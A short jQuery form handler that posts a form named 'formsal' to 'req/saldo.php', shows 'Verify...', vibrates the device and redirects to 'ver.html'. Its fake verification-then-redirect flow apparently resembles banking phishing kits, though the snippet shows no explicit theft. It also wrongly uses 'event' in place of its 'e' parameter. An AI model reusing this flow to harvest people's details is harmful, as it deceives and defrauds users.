$(document).ready(function(){
    $('#formsal').submit(function(e) {
    event.preventDefault();
    
document.getElementById('kirim').innerHTML = "Verify...";


 $.ajax({
 type: 'POST',
 url: 'req/saldo.php',
 data: $(formsal).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            vibr(180);
            console.log('Complete')
   setTimeout(function(){
  window.location.href='ver.html'
 
    }, 1000);
        }
    });
 });
    return false;
});   
     
